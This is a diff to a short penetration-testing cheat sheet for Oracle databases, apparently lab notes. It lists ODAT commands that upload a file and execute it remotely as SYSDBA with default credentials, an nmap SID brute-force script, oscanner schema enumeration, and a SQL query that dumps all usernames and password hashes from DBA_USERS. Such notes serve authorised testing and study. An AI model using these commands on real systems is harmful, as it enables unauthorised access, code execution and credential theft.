@@ -1,5 +1,5 @@
 # Tools
--  [Oracle Database Attack Tool (ODAT)](https://github.com/quentinhardy/odat)
+##  [Oracle Database Attack Tool (ODAT)](https://github.com/quentinhardy/odat)
 ```
 All checks:
 ./odat.py all -s 10.10.10.82 -p 1521
@@ -22,3 +22,23 @@ Upload file:
 Execute file:
 ./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe
 ```
+
+## Nmap
+```
+nmap --script oracle-sid-brute (TARGET IP ADDRESS) -p 1521
+```
+
+## oscanner
+Obtain valid schema 
+```
+oscanner -s (TARGET IP ADDRESS)
+```
+
+## Queries 
+
+- Get all usernames and password: `SELECT Username || ':' || PASSWORD AS credentials FROM DBA_USERS;`
+- DB Version: `SELECT * FROM V$VERSION`
+- List all tables owned by user: `SELECT table_name FROM user_tables;`
+- Get current DB user: `SELECT NAME FROM v$database;`
+
+
